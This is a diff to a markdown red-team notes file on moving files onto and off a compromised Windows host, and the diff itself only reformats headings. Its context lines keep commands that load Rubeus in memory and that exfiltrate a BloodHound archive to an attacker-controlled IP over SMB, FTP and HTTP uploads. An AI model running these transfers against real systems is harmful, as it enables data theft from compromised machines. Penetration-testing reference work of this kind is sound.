@@ -4,7 +4,7 @@
 
 Files have to be hosted with a simple server first. `python3 -m http.server` or something equivalent can be used.
 
-1. Invoke-WebRequest
+### 1. Invoke-WebRequest
 
 Example usage:
 
@@ -31,7 +31,7 @@ PS C:\> $ProgressPreference = "SilentlyContinue"
 
 The `Invoke-WebRequest` cmdlet was introduced in PowerShell 3.0 and would not work on older versions.
 
-2. New-Object System.Net.WebClient
+### 2. New-Object System.Net.WebClient
 
 Example usage with `DownloadFile` mode:
 
@@ -61,7 +61,7 @@ PS C:\> [Rubeus.Program]::MainString("currentluid")
 
 The `New-Object System.Net.WebClient` approach works regardless of the version of PowerShell.
 
-3. Certutil.exe
+### 3. Certutil.exe
 
 Example usage:
 
@@ -74,7 +74,7 @@ Unlike the previous two, PowerShell is not needed; it can be used from Command P
 
 ## Exfiltrating from a Windows machine
 
-1. SMB server
+### 1. SMB server
 
 Install [impacket](https://github.com/fortra/impacket) because an SMB server is included in the package:
 
@@ -102,7 +102,7 @@ PS C:\> net use \\192.168.56.2\ensemble hunter2 /user:inte
 PS C:\> copy BH.zip \\192.168.56.2\ensemble\
 ```
 
-2. WebDAV server
+### 2. WebDAV server
 
 Install [wsgidav](https://github.com/mar10/wsgidav) in a virtual environment:
 
@@ -152,7 +152,7 @@ The `.searchConnector-ms` trick is also viable. With a bit of luck, something as
 PS C:\> net use * http://localhost
 ```
 
-3. FTP server
+### 3. FTP server
 
 Install [pyftpdlib](https://github.com/giampaolo/pyftpdlib):
 
@@ -181,7 +181,7 @@ PS C:\> (New-Object Net.WebClient).UploadFile("ftp://192.168.56.2/BH.zip", "C:\W
 
 The designated port does not have to be 21.
 
-4. uploadserver
+### 4. uploadserver
 
 Install [uploadserver](https://github.com/Densaugeo/uploadserver):
 
@@ -242,7 +242,7 @@ PS C:\> Invoke-Upload -Uri "http://192.168.56.2:10000/upload" -FilePath "C:\Wind
 
 [raven](https://github.com/gh0x0st/raven) is a similar project with the same concept.
 
-5. Custom uploadserver
+### 5. Custom uploadserver
 
 Before I found `uploadserver`, I relied on a custom script that offered similar functionality:
 
@@ -283,7 +283,7 @@ PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path "C:\Windows\T
 PS C:\> IWR http://192.168.56.2:10000/ -Method POST -Body "{`"BH.zip`":`"$b64`"}"
 ```
 
-6. Python standalone package
+### 6. Python standalone package
 
 Since version 3.7, Python comes as a standalone package and installation is not needed.
 
@@ -304,7 +304,7 @@ The files can be exfiltrated from this directory:
 inte@debian-pc:~$ wget http://10.10.10.10:10000/BH.zip
 ```
 
-7. Installing Python with MSIX file
+### 7. Installing Python with MSIX file
 
 TODO: <https://trustedsec.com/blog/operating-inside-the-interpreted-offensive-python>
 
